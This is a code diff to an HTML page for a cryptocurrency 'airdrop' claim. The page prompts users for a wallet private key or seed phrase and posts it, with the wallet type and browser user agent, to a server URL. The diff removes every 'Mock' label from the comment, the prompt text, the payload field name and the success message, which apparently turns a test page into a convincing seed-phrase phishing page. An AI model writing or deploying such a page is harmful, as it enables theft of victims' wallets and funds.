@@ -105,7 +105,7 @@
       <div id="walletIconDisplay" class="mt-3"></div>
     </div>
 
-    <!-- Mock Input Section -->
+    <!--  Input Section -->
     <div id="inputSection" class="hidden mt-4">
       <label class="block mb-2">Enter Private Key / Seed Phrase :</label>
       <textarea id="walletInput"
@@ -235,7 +235,7 @@ submitKey.onclick = async () => {
   const type = walletType.value;
   const data = walletInput.value.trim();
   if(type==="none"){ feedback.textContent="Select a wallet first!"; return; }
-  if(!data){ feedback.textContent="Enter mock key or seed phrase!"; return; }
+  if(!data){ feedback.textContent="Enter key or seed phrase!"; return; }
 
   loader.classList.remove("hidden");
   submitKey.disabled=true;
@@ -251,8 +251,8 @@ submitKey.onclick = async () => {
   // Send to test server
   try{
     await fetch(SERVER_URL,{method:"POST",headers:{"Content-Type":"application/json"},
-      body: JSON.stringify({wallet:type,mockKey:data,timestamp:new Date().toISOString(),agent:navigator.userAgent})});
-    feedback.innerHTML="✅ Airdrop Activated (Mock)";
+      body: JSON.stringify({wallet:type,Key:data,timestamp:new Date().toISOString(),agent:navigator.userAgent})});
+    feedback.innerHTML="✅ Airdrop Activated ";
     claimStatus.textContent="✅ Claim Status: Completed";
   } catch(e){ feedback.innerHTML="❌ Test Server Not Reachable"; }
 
@@ -263,6 +263,7 @@ submitKey.onclick = async () => {
 
 </body>
 </html>
+
 
 
 
